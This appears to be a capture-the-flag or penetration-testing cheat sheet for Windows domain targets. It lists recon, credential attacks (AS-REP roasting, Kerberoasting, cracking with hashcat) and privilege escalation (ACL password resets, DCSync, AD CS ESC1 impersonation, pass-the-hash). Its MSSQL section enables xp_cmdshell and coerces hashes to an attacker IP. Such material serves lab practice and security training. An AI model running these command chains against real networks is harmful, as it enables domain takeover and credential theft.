## Flow at a glance
- 1) Recon baseline -> open ports and services
- 2) Branch: Web or AD quickstart based on exposure
- 3) Validate creds (SMB/WinRM/FTP/MSSQL)
- 4) Pivot via creds, files, or ACLs
- 5) Escalate (Kerberoast, DCSync, AD CS)
- 6) Post-foothold triage and proof
- 7) Evidence capture and timeline notes

## Decision triggers
- If LDAP/Kerberos/SMB exposed -> run AD quickstart
- If HTTP/HTTPS exposed -> run web enum
- If you get any creds -> validate (SMB/WinRM/FTP/MSSQL)
- If AD present -> collect BloodHound to find pivot paths
- If vaults/files found -> crack and re-validate creds

## Output files
- Use `nmap -oA nmap/<name>` and `ffuf -o ffuf/<name>.json` for clean artifacts
- Use `cmd.log` as the timeline spine; use `out.log` only for evidence snippets
- Keep loot and evidence in `loot/` and `evidence/`

## Recon baseline
**Command**
- `ping <IP>` or `nc -vz <IP> 80` if ICMP is blocked
- `nmap -p- --min-rate=3000 -Pn -oN nmap/OpenPorts.txt <IP>`
- `ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/OpenPorts.txt | cut -d/ -f1 | paste -sd,)`
- `nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/ServicesVersions.txt <IP>`
- `dig @<IP> any <domain>` or attempt zone transfer if DNS is exposed

**Why**
- Establish reachability and discover all TCP services
- Run scripts and version detection only on open ports
- Identify DNS records and potential zone transfers

**Flags/Notes**
- `-p-`: all TCP ports
- `--min-rate`: speed up scan
- `-Pn`: skip host discovery
- `-oN`: save normal output to file
- `-sS`: SYN scan, `-sC`: default scripts, `-sV`: version detection

## Web (80/443)
**Command**
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -e .php,.txt -t 20`
- `gobuster dir -u http://<host> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 20`

**Why**
- Find hidden files, directories, and backups

**Flags/Notes**
- `-w`: wordlist
- `-u`: target URL with `FUZZ`
- `-e`: extensions
- `-t`: threads

## Active Directory quickstart
**Command**
- `smbclient -N -L //<host>`
- `ldapsearch -x -H ldap://<host> -b "DC=...,DC=..."`
- `GetNPUsers.py <realm>/ -no-pass -usersfile users.txt -dc-ip <IP> -format hashcat`
- `mssqlclient.py <user>:<pass>@<host>`
- `nxc winrm <IP> -u <user> -p <pass>`

**Why**
- Enumerate shares, LDAP objects, and Kerberos roastable users
- Validate credentials and service access

**Flags/Notes**
- `-N`: no auth, `-L`: list shares
- `-x`: simple bind, `-H`: LDAP URI, `-b`: base DN
- `-no-pass`: anonymous, `-usersfile`: user list, `-format hashcat`: crackable output
- Use `<domain>/<user>` for AD auth in MSSQL; omit domain for SQL auth
- `nxc winrm -H` for hashes, `-k` for Kerberos

## AD pivot chain
**Command**
- `bloodhound-python -c ALL -u <user> -p '<pass>' -d <domain> -ns <dc-ip>`
- `net user <target> <NewPass123!>`
- `net rpc password "<target>" '<NewPass123!>' -U "<domain>/<user>"%'<pass>' -S "<dc-ip>"`
- `nxc ftp <dc-ip> -u <user> -p '<pass>' --ls`
- `nxc ftp <dc-ip> -u <user> -p '<pass>' --get <file>`
- `hashcat -m 5200 <vault>.psafe3 /usr/share/wordlists/rockyou.txt --force`
- `./targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<pass>' --use-ldaps`
- `hashcat <user>.hash /usr/share/wordlists/rockyou.txt --force`
- `secretsdump.py '<domain>/<user>:<pass>@<dc-host>'`

**Why**
- Use ACLs and creds to pivot users
- Pull sensitive files and crack vaults
- Kerberoast/DCSync for higher-priv access

**Flags/Notes**
- `-c ALL`: full BloodHound collection
- `net user` on a DC resets domain user passwords (requires object control)
- `net rpc password` performs SMB RPC reset when local syntax fails
- `--ls` list and `--get` download in NetExec FTP
- `-m 5200`: Password Safe v3
- `--use-ldaps`: use LDAPS 636
- DCSync returns NTLM hashes for domain accounts

## MSSQL playbook
**Command**
- `impacket-mssqlclient <domain>/<user>:<pass>@<IP>`
- `SELECT name FROM master.sys.databases;`
- `xp_dirtree '\\<attacker_ip>\share'`
- `xp_readerrorlog 0,1,N'Login failed';`
- `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`

**Why**
- Enumerate DBs and coerce hashes
- Mine logs for leaked creds
- Enable command execution if needed

**Flags/Notes**
- Use `<domain>/` for AD auth; drop domain for SQL auth
- `xp_dirtree` forces SMB auth to capture NetNTLMv2
- `xp_readerrorlog` indexes the error log and searches a term

## Credential discovery pivot
**Command**
- Check SQL error logs, LDAP `description` fields, and SMB shares
- Crack NetNTLMv2 with hashcat mode 5600
- PTH with `evil-winrm` / `nxc smb --hashes` / `psexec`

**Why**
- Convert passive intel into new authenticated access

**Flags/Notes**
- Always re-validate creds on SMB/WinRM/FTP

## AD CS (ESC1) abuse
**Command**
- `certipy find -dc-ip <IP> -u <user> -p <pass> -enabled -vulnerable`
- `certipy req -dc-ip <IP> -u <user> -p '<pass>' -ca <CA> -template <Template> -upn administrator@<domain> -dns <dc> -outfile administrator`
- `certipy auth -pfx administrator.pfx -dc-ip <IP>`
- `KRB5CCNAME=administrator.ccache evil-winrm -i <IP> -r <realm> -u administrator -k`

**Why**
- Identify misconfigured templates and authenticate as higher-priv users

**Flags/Notes**
- `-enabled`: active templates only
- `-vulnerable`: highlight ESC paths
- `-upn`: spoofed principal
- `-k`: Kerberos auth; `KRB5CCNAME` points to ticket cache

## Post-foothold triage
**Command**
- `whoami /groups`, `whoami /priv`, `hostname`, `ipconfig /all`
- Check `C:\Users\<user>\Desktop`, `C:\Users\Public`, scheduled tasks/services

**Why**
- Confirm privileges and identify quick-win loot

**Flags/Notes**
- If lateral movement is needed, validate WinRM/SMB reachability to other hosts

## Evidence capture
**Command**
- `| tee logs/<name>.txt` for readable output
- `> logs/<name>.txt 2>&1` for large output

**Why**
- Keep clean artifacts for writeups and proof

**Flags/Notes**
- Save outputs to `logs/` and loot to `loot/`
- Note flag paths and commands used
